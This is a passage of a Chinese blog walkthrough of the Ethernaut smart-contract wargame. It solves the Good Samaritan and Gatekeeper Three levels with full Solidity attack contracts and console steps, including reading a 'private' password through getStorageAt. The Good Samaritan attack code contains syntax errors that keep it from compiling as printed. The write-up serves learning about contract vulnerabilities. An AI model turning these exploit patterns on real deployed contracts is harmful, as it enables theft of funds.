&#123;</span><br><span class="line">        coin &#x3D; coin_;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface INotifyable &#123;</span><br><span class="line">    function notify(uint256 amount) external;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>通关条件：</strong>将合约<code>Wallet</code>中的余额变为零。</p><p>想要将其清零，要么每次获取10个，要么触发异常，使得<code>wallet.transferRemainder(msg.sender)</code>能够被执行，前面的方式不现实，因为合约<code>Wallet</code>中的余额被初始化为$10^6$，而后者关键在于如何能够触发异常。</p><p>观察<code>Coin</code>合约，我们可以知道，当转账方是一个合约账号时候，会尝试运行其<code>notify</code>函数，也就是说这一点我们是可以控制的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity &gt;&#x3D;0.8.0 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">interface INotifyable &#123;</span><br><span class="line">    function notify(uint256 amount) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract GoodSamaritanAttack is INotifyable&#123;</span><br><span class="line">	</span><br><span class="line">	error NotEnoughBalance();</span><br><span class="line">	address instance public;</span><br><span class="line">	constructor(address _instance)&#123;</span><br><span class="line">		instance &#x3D; _instance;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function attack()public&#123;</span><br><span class="line">		(bool success, _) &#x3D; instance.call(</span><br><span class="line">			abi.encodeWithSignature(&quot;requestDonation()&quot;)</span><br><span class="line">		);</span><br><span class="line">		require(success);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function notify(uint256 amount) external&#123;</span><br><span class="line">		if(amount &#x3D;&#x3D; 10)&#123;</span><br><span class="line">   			revert NotEnoughBalance();	</span><br><span class="line">   		&#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Gatekeeper-Three"><a href="#Gatekeeper-Three" class="headerlink" title="Gatekeeper Three"></a>Gatekeeper Three</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract SimpleTrick &#123;</span><br><span class="line">  GatekeeperThree public target;</span><br><span class="line">  address public trick;</span><br><span class="line">  uint private password &#x3D; block.timestamp;</span><br><span class="line"></span><br><span class="line">  constructor (address payable _target) &#123;</span><br><span class="line">    target &#x3D; GatekeeperThree(_target);</span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line">  function checkPassword(uint _password) public returns (bool) &#123;</span><br><span class="line">    if (_password &#x3D;&#x3D; password) &#123;</span><br><span class="line">      return true;</span><br><span class="line">    &#125;</span><br><span class="line">    password &#x3D; block.timestamp;</span><br><span class="line">    return false;</span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line">  function trickInit() public &#123;</span><br><span class="line">    trick &#x3D; address(this);</span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line">  function trickyTrick() public &#123;</span><br><span class="line">    if (address(this) &#x3D;&#x3D; msg.sender &amp;&amp; address(this) !&#x3D; trick) &#123;</span><br><span class="line">      target.getAllowance(password);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract GatekeeperThree &#123;</span><br><span class="line">  address public owner;</span><br><span class="line">  address public entrant;</span><br><span class="line">  bool public allow_enterance &#x3D; false;</span><br><span class="line">  SimpleTrick public trick;</span><br><span class="line"></span><br><span class="line">  function construct0r() public &#123;</span><br><span class="line">      owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender &#x3D;&#x3D; owner);</span><br><span class="line">    require(tx.origin !&#x3D; owner);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    require(allow_enterance &#x3D;&#x3D; true);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree() &#123;</span><br><span class="line">    if (address(this).balance &gt; 0.001 ether &amp;&amp; payable(owner).send(0.001 ether) &#x3D;&#x3D; false) &#123;</span><br><span class="line">      _;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getAllowance(uint _password) public &#123;</span><br><span class="line">    if (trick.checkPassword(_password)) &#123;</span><br><span class="line">        allow_enterance &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function createTrick() public &#123;</span><br><span class="line">    trick &#x3D; new SimpleTrick(payable(address(this)));</span><br><span class="line">    trick.trickInit();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter() public gateOne gateTwo gateThree returns (bool entered) &#123;</span><br><span class="line">    entrant &#x3D; tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive () external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>通关条件：</strong>成功调用<code>enter</code>，并将<code>entrant</code>修改为我们的地址。</p><p><code>gateOne</code>有两个条件对于第二个条件，我们借助一个攻击合约即可，即合约地址作为<code>owner</code>，攻击合约想要成为<code>owner</code>，直接调用假的构造函数即可。</p><p>对于<code>gateTwo</code>，我们需要调用<code>getAllowance</code>函数并传入一个密码，而该秘密存放在合约<code>SimpleTrick</code>中，虽然是<code>private</code>类型，但是我们可以通关<code>web3.eth.getStorageAt(address,index)</code>的方式获取。</p><p>对于<code>gateThree</code>，需要合约<code>GatekeeperThree</code>中的以太币大于0.001，且要求该合约向<code>owner</code>，即我们的攻击合约转账时候失败，那我们直接将我们的合约设置成拒绝接收以太币即可，攻击合约如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">contract GatekeeperThreeAttack&#123;</span><br><span class="line">	address public instance;</span><br><span class="line">	</span><br><span class="line">	constructor(address _instance)&#123;</span><br><span class="line">		instance &#x3D; _instance;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	function beOwner()public&#123;</span><br><span class="line">		(bool success, bytes memory data) &#x3D; instance.call(</span><br><span class="line">                abi.encodeWithSignature(&quot;construct0r()&quot;)</span><br><span class="line">            );</span><br><span class="line">        require(success);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	function change_allow_enterance(uint pwd)public&#123;</span><br><span class="line">		(bool success, bytes memory data) &#x3D; instance.call(</span><br><span class="line">                abi.encodeWithSignature(&quot;getAllowance(uint256)&quot;, pwd)</span><br><span class="line">            );</span><br><span class="line">        require(success);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	function attack()public&#123;</span><br><span class="line">		(bool success, bytes memory data) &#x3D; instance.call(</span><br><span class="line">                abi.encodeWithSignature(&quot;enter()&quot;)</span><br><span class="line">            );</span><br><span class="line">        require(success);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署上面攻击合约后，先调用<code>beOwner</code>函数，将攻击合约变成<code>GatekeeperThree</code>的<code>owner</code>。</p><p>然后我们在控制台中，输入以下内容，部署一个<code>SimpleTrick</code>合约：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.createTrick()</span><br></pre></td></tr></table></figure><p>然后获取其地址：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.trick()</span><br><span class="line"><span class="comment">// '0xe5CD5D17bA2E5A4d68982FdB47FC28E933d9B5Fa'</span></span><br></pre></td></tr></table></figure><p>获取其内的密码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.eth.getStorageAt(<span class="string">'0xe5CD5D17bA2E5A4d68982FdB47FC28E933d9B5Fa'</span>,<span class="number">2</span>)</span><br><span class="line"><span class="comment">// '0x0000000000000000000000000000000000000000000000000000000064196c58'</span></span><br></pre></td></tr></table></figure><p>然后调用攻击合约中的<code>change_allow_enterance</code>，并将<code>0x64196c58</code>传入，确保<code>allow_enterance</code>为真</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.allow_enterance() == <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>然后向<code>GatekeeperThree</code>转入0.0011以太币，确保到账</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> getBalance(instance)</span><br><span class="line"><span class="comment">// 0.0011</span></span><br></pre></td></tr></table></figure><p>然后调用攻击合约中的<code>attack</code>函数，确保调用正常：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.entrant() == player</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>磕磕碰碰，花了一个多月，终于完（chao）成（wan）了所有关卡了，许多关卡设计得挺有意思的，但是有些关卡难度不是一般大😭。</p></div><div class="reward-container"><div>假如对您有所帮助，那就请我喝咖啡吧~~</div> <button onclick='var qr=document.getElementById("qr");qr.style.display="none"===qr.style.display?"block":"none"'> 打赏</button><div id="qr" style="display:none"><div style="display:inline-block"> <img src="/images/WeChat.png" alt="YaleXin 微信支付"><p>微信支付</p></div><div style="display:inline-block"> <img src="/images/Alipay.jpg" alt="YaleXin 支付宝"><p>支付宝</p></div></div></div><footer class="post-footer"><div class="post-tags"><a href="/tags/Solidity/" rel="tag"><i class="fa fa-tag"></i> Solidity</a><a href="/tags/Web3-0/" rel="tag"><i class="fa fa-tag"></i> Web3.0</a></div><div class="post-nav"><div class="post-nav-item"><a href="/2023/03/11/%E3%80%90Ethernaut%E9%97%AF%E5%85%B3%E5%BD%95%E3%80%91%E4%B8%AD%E7%AF%87/" rel="prev" title="【Ethernaut闯关录】中篇"><i class="fa fa-chevron-left"></i> 【Ethernaut闯关录】中篇</a></div><div class="post-nav-item"> <a href="/2023/05/04/%E5%85%B3%E4%BA%8E%E4%BA%8C%E5%88%86%E7%AE%97%E6%B3%95%E4%B8%AD%E7%9A%84%E8%BE%B9%E7%95%8C%E9%97%AE%E9%A2%98%E7%9A%84%E6%80%9D%E8%80%83/" rel="next" title="关于二分算法中的边界问题的思考">关于二分算法中的边界问题的思考<i class="fa fa-chevron-right"></i></a></div></div></footer></article><div><div><div style="text-align:center;color:#ccc;font-size:14px">------ 文章结束------</div></div></div></div></div><script>
  window.addEventListener('tabs:register', () => {
    let activeClass = CONFIG.comments.activeClass;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script></div><div class="toggle sidebar-toggle"><span class="toggle-line toggle-line-first"></span><span class="toggle-line toggle-line-middle"></span><span class="toggle-line toggle-line-last"></span></div><aside class="sidebar"><div class="sidebar-inner"><ul class="sidebar-nav motion-element"><li class="sidebar-nav-toc"> 文章目录</li><li class="sidebar-nav-overview"> 站点概览</li></ul><div class="post-toc-wrap sidebar-panel"><div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Denial"><span class="nav-number">1.</span> <span class="nav-text">Denial</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Shop"><span class="nav-number">2.</span> <span class="nav-text">Shop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Dex"><span class="nav-number">3.</span> <span class="nav-text">Dex</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Dex-Two"><span class="nav-number">4.</span> <span class="nav-text">Dex Two</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Puzzle-Wallet"><span class="nav-number">5.</span> <span class="nav-text">Puzzle Wallet</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Motorbike"><span class="nav-number">6.</span> <span class="nav-text">Motorbike</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DoubleEntryPoint"><span class="nav-number">7.</span> <span class="nav-text">DoubleEntryPoint</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Good-Samaritan"><span class="nav-number">8.</span> <span class="nav-text">Good Samaritan</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Gatekeeper-Three"><span class="nav-number">9.</span> <span class="nav-text">Gatekeeper Three</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#写在最后"><span class="nav-number">10.</span> <span class="nav-text">写在最后</span></a></li></ol></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"> <img class="site-author-image" itemprop="image" alt="YaleXin" src="/uploads/cat_mouse.jpg"><p class="site-author-name" itemprop="name">YaleXin</p><div class="site-description" itemprop="description">学渣一枚</div></div><div class="site-state-wrap motion-element"><nav class="site-state"><div class="site-state-item site-state-posts"> <a href="/archives/"><span class="site-state-item-count">125</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"> <a href="/categories/"><span class="site-state-item-count">13</span> <span class="site-state-item-name">分类</span></a></div><div class="site-state-item site-state-tags"> <a href="/tags/"><span class="site-state-item-count">118</span> <span class="site-state-item-name">标签</span></a></div></nav></div></div></div></aside><div id="sidebar-dimmer"></div></div></main><footer class="footer"><div class="footer-inner"><div class="copyright"> &copy; 2020 – <span itemprop="copyrightYear">2023</span><span class="with-love"><i class="fa fa-fas fa-heartbeat"></i></span> <span class="author" itemprop="copyrightHolder">YaleXin</span> <span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-area-chart"></i></span> <span title="站点总字数">494k</span> <span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-coffee"></i></span> <span title="站点阅读时长">7:29</span></div> <span>本站已在此等候您 <span id="dnum" style="color:#35b8ff">0</span> 天</span> <span><span id="hnum" style="color:#35b8ff">0</span> 小时 <span id="mnum" style="color:#35b8ff">0</span> 分 <span id="snum" style="color:#35b8ff">0</span> 秒</span><script>var now=new Date;function createtime(){var n=new Date("02/21/2020 11:30:00");now.setTime(now.getTime()+250),days=(now-n)/1e3/60/60/24,dnum=Math.floor(days),hours=(now-n)/1e3/60/60-24*dnum,hnum=Math.floor(hours),1==String(hnum).length&&(hnum="0"+hnum),minutes=(now-n)/1e3/60-1440*dnum-60*hnum,mnum=Math.floor(minutes),1==String(mnum).length&&(mnum="0"+mnum),seconds=(now-n)/1e3-86400*dnum-3600*hnum-60*mnum,snum=Math.round(seconds),1==String(snum).length&&(snum="0"+snum),document.getElementById("dnum").innerHTML=dnum,document.getElementById("hnum").innerHTML=hnum,document.getElementById("mnum").innerHTML=mnum,document.getElementById("snum").innerHTML=snum}setInterval("createtime()",250)</script><div class="powered-by"> <span>powered by</span> <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a></div><div class="busuanzi-count"><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span class="post-meta-item" id="busuanzi_container_site_uv" style="display:none"><span class="post-meta-item-icon"><i class="fa fa-user"></i></span> <span class="site-uv" title="总访客量"><span>总访客量：</span><span id="busuanzi_value_site_uv"></span></span></span> <span class="post-meta-divider">|</span><span class="post-meta-item" id="busuanzi_container_site_pv" style="display:none"><span class="post-meta-item-icon"><i class="fa fa-eye"></i></span> <span class="site-pv" title="总访问量"><span>总访问量：</span><span id="busuanzi_value_site_pv"></span></span></span></div><script>
  function leancloudSelector(url) {
    url = encodeURI(url);
    return document.getElementById(url).querySelector('.leancloud-visitors-count');
  }
  if (CONFIG.page.isPost) {
    function addCount(Counter) {
      var visitors = document.querySelector('.leancloud_visitors');
      var url = decodeURI(visitors.getAttribute('id'));
      var title = visitors.getAttribute('data-flag-title');

      Counter('get', `/classes/Counter?where=${JSON.stringify({ url })}`)
        .then(response => response.json())
        .then(({ results }) => {
          if (results.length > 0) {
            var counter = results[0];
            Counter('put', '/classes/Counter/' + counter.objectId, { time: { '__op': 'Increment', 'amount': 1 } })
              .then(response => response.json())
              .then(() => {
                leancloudSelector(url).innerText = counter.time + 1;
              })
              .catch(error => {
                console.error('Failed to save visitor count', error);
              })
          } else {
              Counter('post', '/classes/Counter', { title: title, url: url, time: 1 })
                .then(response => response.json())
                .then(() => {
                  leancloudSelector(url).innerText = 1;
                })
                .catch(error => {
                  console.error('Failed to create', error);
                });
          }
        })
        .catch(error => {
          console.error('LeanCloud Counter Error', error);
        });
    }
  } else {
    function showTime(Counter) {
      var visitors = document.querySelectorAll('.leancloud_visitors');
      var entries = [...visitors].map(element => {
        return decodeURI(element.getAttribute('id'));
      });

      Counter('get', `/classes/Counter?where=${JSON.stringify({ url: { '$in': entries } })}`)
        .then(response => response.json())
        .then(({ results }) => {
          if (results.length === 0) {
            document.querySelectorAll('.leancloud_visitors .leancloud-visitors-count').forEach(element => {
              element.innerText = 0;
            });
            return;
          }
          for (let item of results) {
            let { url, time } = item;
            leancloudSelector(url).innerText = time;
          }
          for (let url of entries) {
            var element = leancloudSelector(url);
            if (element.innerText == '') {
              element.innerText = 0;
            }
          }
        })
        .catch(error => {
          console.error('LeanCloud Counter Error', error);
        });
    }
  }

  fetch('https://app-router.leancloud.cn/2/route?appId=CjaKbRAizU0DNH3B4Hllhtwp-gzGzoHsz')
    .then(response => response.json())
    .then(({ api_server }) => {
      var Counter = (method, url, data) => {
        return fetch(`https://${api_server}/1.1${url}`, {
          method: method,
          headers: {
            'X-LC-Id'     : 'CjaKbRAizU0DNH3B4Hllhtwp-gzGzoHsz',
            'X-LC-Key'    : 'B61jy2Xnwe90oJ2dtUeF6HHU',
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(data)
        });
      };
      if (CONFIG.page.isPost) {
        if (CONFIG.hostname !== location.hostname) return;
        addCount(Counter);
      } else if (document.querySelectorAll('.post-title-link').length >= 1) {
        showTime(Counter);
      }
    });
  </script></div></footer></div><script src="/lib/anime.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script><script src="/lib/velocity/velocity.min.js"></script><script src="/lib/velocity/velocity.ui.min.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/pisces.js"></script><script src="/js/next-boot.js"></script><script>!function(){var t=document.createElement("script"),e=window.location.protocol.split(":")[0];t.src="https"===e?"https://zz.bdstatic.com/linksubmit/push.js":"http://push.zhanzhang.baidu.com/push.js";var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(t,s)}()</script></body></html>